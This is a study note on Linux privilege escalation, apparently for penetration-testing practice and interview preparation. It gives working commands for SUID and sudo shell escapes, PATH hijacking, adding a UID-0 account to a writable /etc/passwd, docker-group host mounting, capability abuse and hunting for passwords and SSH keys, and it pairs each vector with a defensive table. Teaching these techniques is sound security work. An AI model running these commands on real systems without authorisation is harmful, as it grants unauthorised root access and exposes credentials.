## 1. Introduction

**Privilege escalation** is the process of gaining higher-level access than initially granted — typically going from a low-privileged shell to root. This note consolidates the offensive-security counterpart to everything else in this folder: the same permissions, cron, SUID, and PATH concepts covered elsewhere become concrete attack vectors here. Essential knowledge for VAPT work and for understanding exactly what [[Linux_Security_Hardening]] is defending against.

## 2. Enumeration — The First Step

Before attempting escalation, systematically gather information about the system:

```bash
whoami; id                          # current user and group memberships
uname -a                              # kernel version — check against known exploits
cat /etc/os-release                     # distro and version
sudo -l                                   # what can this user run as another user/root?
find / -perm -4000 -type f 2>/dev/null      # SUID binaries
find / -perm -2000 -type f 2>/dev/null      # SGID binaries
find / -writable -type f 2>/dev/null        # world-writable files
crontab -l; cat /etc/crontab               # scheduled tasks
ss -tulnp                                    # listening services
cat /etc/passwd | grep -v nologin              # accounts with a usable shell
```

**Automated enumeration tools:** LinPEAS, LinEnum, and Linux Smart Enumeration (lse.sh) automate much of this discovery process and highlight likely escalation paths.

## 3. SUID/SGID Binary Abuse

See [[File_Permissions]] for the underlying mechanism. If a SUID root binary can be manipulated to execute arbitrary commands, those commands run as root.

```bash
find / -perm -4000 -type f 2>/dev/null
```

**GTFOBins** (gtfobins.github.io) is the canonical reference documenting how common, legitimate Unix binaries can be abused for privilege escalation, file read/write, or shell spawning **if** they have unexpected SUID permissions or are permitted via sudo.

```bash
# Example: if 'find' has the SUID bit set (unusual, but happens via misconfiguration)
find . -exec /bin/sh -p \; -quit          # spawns a root shell
```

## 4. Sudo Misconfigurations

```bash
sudo -l          # shows exactly what the current user can run as root/another user without a full password
```

**Common misconfiguration patterns:**

| Pattern | Risk |
|---|---|
| `(ALL) NOPASSWD: /usr/bin/vim` | Vim can execute shell commands (`:!sh`), granting a root shell |
| `(ALL) NOPASSWD: /usr/bin/python3` | Python can spawn a shell directly (`python3 -c 'import os; os.system("/bin/sh")'`) |
| Wildcard paths (`/usr/bin/*`) | Overly broad, likely covers dangerous binaries unintentionally |
| Commands without absolute paths | Vulnerable to PATH hijacking (see below) |

Checking whether a sudo-permitted binary has a known escape technique in **GTFOBins** is a standard step in real assessments.

## 5. PATH Hijacking

See [[Environment_Variables_and_Shell_Config]] for the underlying $PATH mechanism.

**Scenario:** a root-owned script or SUID binary calls a command without specifying its full path (e.g., just `service` instead of `/usr/sbin/service`), AND the effective `$PATH` includes a directory writable by the attacker earlier than the legitimate binary's real location.

```bash
echo $PATH                                  # check current PATH order
echo '/bin/bash' > /writable/early/dir/service
chmod +x /writable/early/dir/service
export PATH=/writable/early/dir:$PATH
# Now trigger the vulnerable script — it runs the attacker's fake "service" as root
```

## 6. Writable Cron Jobs and Scripts

See [[Cron_and_Task_Scheduling]] for the underlying mechanism.

```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/
```

If a cron job runs as root and calls a script that a lower-privileged user can write to, editing that script grants command execution as root the next time the job fires.

## 7. Weak File/Directory Permissions

```bash
find / -writable -not -path "/proc/*" 2>/dev/null | grep -v "^/tmp"    # exclude expected writable tmp dirs
ls -la /etc/passwd /etc/shadow /etc/sudoers          # verify these aren't unexpectedly writable
```

If `/etc/passwd` is writable by a non-root user, an attacker can directly add a new UID-0 entry (see [[User_and_Group_Management]]) — instant root:

```bash
openssl passwd -1 -salt xyz password123          # generate a compatible hash
echo 'hacker:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

## 8. Exploiting Weak/Excessive Group Memberships

As covered in [[User_and_Group_Management]], certain group memberships are effectively root-equivalent:

| Group | Risk |
|---|---|
| `docker` | Members can mount the host filesystem into a privileged container, achieving root on the host |
| `disk` | Can access raw block devices directly, bypassing filesystem permissions entirely |
| `shadow` | Can read `/etc/shadow`, enabling offline password hash cracking |

```bash
id                     # check current group memberships
docker run -v /:/mnt --rm -it alpine chroot /mnt sh    # classic docker-group escalation, if available
```

## 9. Kernel Exploits

Outdated kernels may have known, weaponized local privilege escalation vulnerabilities (e.g., Dirty COW, Dirty Pipe, various overlayfs/namespace bugs).

```bash
uname -a                    # check kernel version
searchsploit linux kernel <version>    # search for known exploits (via exploit-db offline mirror)
```

**Risk consideration:** kernel exploits can crash the system if unstable — generally a higher-risk, later-resort technique in a professional engagement compared to configuration-based escalation paths.

## 10. Capabilities (An Alternative to Full SUID)

Linux **capabilities** allow granting specific root-like privileges to a binary without giving it full root via SUID — but a binary with a powerful capability like `cap_setuid` is just as dangerous as SUID root if abusable.

```bash
getcap -r / 2>/dev/null              # find binaries with capabilities set
```

```bash
# If python3 has cap_setuid+ep set:
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

## 11. Password/Credential Hunting

```bash
grep -r "password" /etc/ 2>/dev/null
find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -l "password" 2>/dev/null
cat ~/.bash_history                      # command history can leak passwords typed on the command line
find / -name "id_rsa*" 2>/dev/null          # SSH private keys left in accessible locations
```

## 12. Defensive Mapping — Countering Each Vector

| Attack Vector | Defense (see [[Linux_Security_Hardening]]) |
|---|---|
| SUID abuse | Regularly audit `find / -perm -4000`; remove SUID from anything unnecessary |
| Sudo misconfig | Least-privilege sudoers entries with absolute paths, avoid GTFOBins-listed commands |
| PATH hijacking | Always use absolute paths in scripts/cron; avoid `.` in system PATH |
| Writable cron scripts | Correct ownership/permissions (root-owned, not group/world-writable) |
| Weak group memberships | Audit `docker`/`disk`/`shadow` group membership regularly |
| Kernel exploits | Timely patching (see [[Package_Management]]) |
| Credential exposure | Avoid plaintext passwords in configs/history; use secrets managers |

## 13. Interview Questions

1. What's the first thing you should do upon getting a low-privilege shell during an assessment? → **Systematic enumeration — check sudo -l, SUID binaries, cron jobs, kernel version, writable files**
2. What is GTFOBins, and how is it used in privilege escalation? → **A reference cataloging how legitimate Unix binaries can be abused for escalation/shell access if granted SUID or permitted via sudo**
3. How does PATH hijacking lead to privilege escalation? → **If a privileged script calls a command without an absolute path, and an attacker controls an earlier directory in $PATH, their malicious binary executes instead**
4. Why is membership in the `docker` group nearly equivalent to root access? → **Docker containers can mount the host filesystem, and since the daemon runs as root, this allows escaping to full host root**
5. What would you check immediately if you found `/etc/passwd` was world-writable? → **You could append a new entry with UID 0 to create an instant root-equivalent account**
6. Why are kernel exploits often considered a last-resort escalation technique in professional engagements? → **They can crash or destabilize the target system, unlike safer configuration-based escalation paths**

## 14. Key Points

- Privilege escalation exploits **misconfigurations** in permissions, sudo, cron, PATH, groups, and — less commonly — the kernel itself.
- **Enumeration first** — `sudo -l`, SUID/SGID audit, cron review, and group membership checks reveal most real-world paths.
- **GTFOBins** is the standard reference for abusing legitimate binaries granted excessive privilege (SUID or sudo).
- **PATH hijacking** and **writable cron scripts/files** exploit the exact mechanisms covered in [[Environment_Variables_and_Shell_Config]] and [[Cron_and_Task_Scheduling]].
- Every escalation vector here has a direct defensive counterpart in [[Linux_Security_Hardening]] — this note is effectively the attacker's view of that same terrain.

---
*Related: [[File_Permissions]], [[User_and_Group_Management]], [[Cron_and_Task_Scheduling]], [[Environment_Variables_and_Shell_Config]], [[Linux_Security_Hardening]]*
